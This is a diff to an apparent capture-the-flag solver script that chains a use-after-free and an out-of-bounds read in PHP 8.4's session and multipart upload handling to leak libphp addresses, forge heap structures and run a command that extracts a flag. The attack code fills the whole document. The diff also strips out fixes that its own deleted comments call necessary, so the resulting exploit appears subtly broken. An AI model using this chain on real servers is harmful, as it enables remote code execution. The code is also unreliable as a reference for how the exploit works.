@@ -29,13 +29,20 @@ php.ini-production):
 The command drops /flag.txt into the session save path as a flash message;
 a final GET with that PHPSESSID renders the flag out of the app itself.
 
-usage: solve.py HOST PORT
+Transport: plain HTTP by default (local compose listens on :32003). The
+platform endpoint is HTTPS-only, so sockets are wrapped in TLS when the
+target port is 443 — or when --https is given; --http forces plaintext.
+Only the socket layer changes: the request bytes, chunked framing and
+Host header are identical either way.
+
+usage: solve.py HOST PORT [--https] [--http]
 """
 from __future__ import annotations
 
 import argparse
 import re
 import socket
+import ssl
 import struct
 import sys
 import time
@@ -46,14 +53,6 @@ BOUNDARY = b"C" * 10
 Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
 LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
 MAIN_BUCKET_COUNT = 87  # stable fingerprint of the main-chunk bucket
-DUP_SLOTS = 4           # duplicate A1 fields that free main-chunk slots (see build_a1)
-# B1 target: a script that is standalone and prints nothing.  The leak is
-# emitted during request startup, but Apache only flushes it once the request
-# finishes, and ps_close_files() has by then freed A1's stale ps_files struct --
-# live memory in this request -- so a bin free list is poisoned.  Compiling the
-# whole front controller trips over it; registry.php defines functions, emits no
-# output and allocates little enough to get the response out.
-LEAK_PATH = "/registry.php"
 FLAG_RE = re.compile(rb"ccsCTF\{[^}\s]+\}")
 
 # x86_64 offsets into libphp.so for the pinned php:8.4.26-apache image.
@@ -83,6 +82,17 @@ EXFIL_CMD = (
 )
 EXFIL_SID = "zz"
 
+# Set by main(): wrap the plain sockets in TLS for the platform endpoint.
+TLS = False
+_SSL_CTX: ssl.SSLContext | None = None
+
+
+def _ssl_ctx() -> ssl.SSLContext:
+    global _SSL_CTX
+    if _SSL_CTX is None:
+        _SSL_CTX = ssl.create_default_context()
+    return _SSL_CTX
+
 
 # --------------------------------------------------------------------------
 # body builders (faithful ports of the reference chain's generators)
@@ -107,15 +117,6 @@ def build_a1() -> bytes:
         out.extend(b"\r\n" + value + b"\r\n")
 
     part(b"PHPSESSID", b"\x00")
-    # Free MAIN-CHUNK small slots for the session init to reuse.  Sending the
-    # same field name twice makes zend_hash_update release the first (early,
-    # main-chunk) value, and ZendMM hands small slots out LIFO, so s_open's
-    # basedir ("/tmp", bin 32) lands in the main chunk instead of in a chunk
-    # that is unmapped when the request bails out.  Without this, B1's
-    # ps_close_files -> efree(basedir) hits a chunk whose header is gone and
-    # panics with "zend_mm_heap corrupted" before the leak is ever sent.
-    for i in range(DUP_SLOTS):
-        part(b"d%03d" % i, b"e" * 7)
     for i in range(parts):
         name = ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)
         if i == 0:
@@ -139,8 +140,6 @@ def build_a1() -> bytes:
         part(("b%04d" % i).encode(), b"B" * big_len)
     for i in range(burners):
         part(("u%02d" % i).encode(), b"U" * burner_len)
-    for i in range(DUP_SLOTS):            # overwrite -> frees the slots above
-        part(b"d%03d" % i, b"l" * 7)
     part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
     out.extend(b"--" + BOUNDARY + b"--\r\n")
     return bytes(out)
@@ -152,21 +151,12 @@ def _forge_fill_value(pages: int, page: int, fake_len: int, idx: int) -> bytes:
     length = pages * 4096 - 25
     v = bytearray(b"A" * length)
     hdr = page * 0x1000 - 0x1018
-    if 0 <= hdr and hdr + 0x18 + 32 <= length:
+    if 0 <= hdr and hdr + 0x18 + 8 <= length:
         struct.pack_into("<I", v, hdr + 0x00, 0)
-        # IS_STRING | IS_STR_INTERNED, not a plain 0x16: php_session_initialize
-        # hands PS(id) to the files handler and the rfc1867 END event then runs
-        # php_rshutdown_session_globals -> zend_string_release(PS(id)).  Marking
-        # the forged header interned makes that release a no-op; otherwise it
-        # efree()s an address inside this fill and poisons a small-bin free list.
-        struct.pack_into("<I", v, hdr + 0x04, 0x106)
+        struct.pack_into("<I", v, hdr + 0x04, 0x16)      # IS_STRING
         struct.pack_into("<Q", v, hdr + 0x08, 0)
         struct.pack_into("<Q", v, hdr + 0x10, fake_len)
-        # php_session_start() runs strpbrk(ZSTR_VAL(id), "\r\n\t <>'\"\\") and
-        # drops PS(id) on a hit, so the forged value has to be a plausible,
-        # NUL-terminated session key -- a leading "/" loses the whole leak.
-        key = (b"zz%02x%03xzz" % (idx % 256, page)).ljust(31, b"a")[:31]
-        v[hdr + 0x18:hdr + 0x18 + 32] = key + b"\x00"
+        v[hdr + 0x18:hdr + 0x18 + 8] = b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB"
     return bytes(v)
 
 
@@ -321,8 +311,17 @@ def status_of(resp: bytes) -> str:
 
 def send(host: str, port: int, request: bytes, timeout: float,
          cap: int = 8 << 20) -> bytes:
+    sock = None
     try:
         sock = socket.create_connection((host, port), timeout=timeout)
+        if TLS:
+            sock = _ssl_ctx().wrap_socket(sock, server_hostname=host)
+    except ssl.SSLError as exc:
+        # not a dead worker — surface it instead of returning b"" silently
+        print("      TLS handshake failed: %s" % exc)
+        if sock is not None:
+            sock.close()
+        return b""
     except OSError:
         return b""  # worker respawning after the UAF crash
     sock.settimeout(timeout)
@@ -439,7 +438,7 @@ def run_chain(host: str, port: int, deadline: float) -> bytes | None:
 
     print("[2/4] B1: stale session id OOB read -> heap + libphp leak")
     t0 = time.monotonic()
-    resp = send_chunked(host, port, LEAK_PATH, build_leak_b(), timeout=120)
+    resp = send_chunked(host, port, "/index.php", build_leak_b(), timeout=120)
     print("      B1 -> %s (%d bytes, %.1fs)" % (
         status_of(resp), len(resp), time.monotonic() - t0))
     try:
@@ -450,15 +449,16 @@ def run_chain(host: str, port: int, deadline: float) -> bytes | None:
     prof = info["profile"]
     print("      arch=%s libphp=%#x candidates=%s" % (
         info["arch"], info["lib"], [hex(b) for b in info["main_candidates"]]))
-    cands = [c for c in info["main_candidates"]
-             if prof["delta_min"] <= info["lib"] - c <= prof["delta_max"]]
-    if not cands:
-        print("      no main-chunk candidate with a plausible delta "
-              "(saw %s); re-leak" % [hex(info["lib"] - c) for c in info["main_candidates"]])
+    if not info["main_candidates"]:
+        print("      no main-chunk candidate")
+        return None
+    delta = info["lib"] - info["main_candidates"][0]
+    if not (prof["delta_min"] <= delta <= prof["delta_max"]):
+        print("      implausible libphp-main delta %#x; re-leak" % delta)
         return None
 
     zif = info["lib"] + prof["zif_offset"]
-    for cand in cands:
+    for cand in info["main_candidates"]:
         if time.monotonic() > deadline:
             print("      out of time")
             return None
@@ -482,18 +482,24 @@ def run_chain(host: str, port: int, deadline: float) -> bytes | None:
 
 
 def main() -> int:
+    global TLS
     parser = argparse.ArgumentParser(description="PHPossessed solver (PHP2Shell)")
     parser.add_argument("host", nargs="?", default="127.0.0.1")
     parser.add_argument("port", nargs="?", default=32003, type=int)
-    parser.add_argument("--retries", type=int, default=14)
+    parser.add_argument("--retries", type=int, default=3)
+    parser.add_argument("--https", dest="https", action="store_true", default=None,
+                        help="wrap sockets in TLS (default when port is 443)")
+    parser.add_argument("--http", dest="https", action="store_false",
+                        help="force plain HTTP even on port 443")
     args = parser.parse_args()
+    TLS = args.https if args.https is not None else args.port == 443
 
     if len(EXFIL_CMD) > 200:
         print("[!] exfil command exceeds the 200-byte carrier limit")
         return 2
 
-    print("[*] target=http://%s:%d/ (php:8.4.26-apache, single mod_php child)"
-          % (args.host, args.port))
+    print("[*] target=%s://%s:%d/ (php:8.4.26-apache, single mod_php child)"
+          % ("https" if TLS else "http", args.host, args.port))
     if not preflight(args.host, args.port):
         print("[!] target not answering /health.txt")
         return 1
@@ -501,10 +507,6 @@ def main() -> int:
     started = time.monotonic()
     deadline = started + 50  # leave headroom to print before the 60s budget
     for attempt in range(1, args.retries + 1):
-        # a failed attempt leaves the single prefork child respawning; starting
-        # A1 against a dead worker just burns the attempt
-        while not preflight(args.host, args.port) and time.monotonic() < deadline:
-            time.sleep(0.2)
         print("[*] chain attempt %d/%d" % (attempt, args.retries))
         flag = run_chain(args.host, args.port, deadline)
         if flag:
